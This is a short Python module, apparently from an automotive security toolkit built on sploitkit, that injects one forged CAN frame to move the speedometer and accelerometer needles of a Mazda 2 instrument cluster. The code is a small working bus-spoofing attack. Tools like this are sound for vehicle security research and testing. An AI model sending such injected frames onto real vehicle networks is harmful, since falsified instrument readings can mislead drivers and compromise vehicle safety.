from sploitkit import *
from pyvit import can
from pyvit.hw import socketcan

class mazda_ic_mover(Module):
    """This module moves the needle of the accelorometer and speedometer of the Mazda 2 instrument cluster.

    Author:  shipcod3
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    }) 
    
    def run(self):
        dev = socketcan.SocketCanDev(self.config.option('INTERFACE').value)

        dev.start()
        print("[*] Moving the accelorometer and speedometer...")
        frame = can.Frame(0x202)
        frame.data = [0x60,0x01,0x60,0x60,0x60,0x60,0x60,0x00]
        dev.send(frame)
        pass
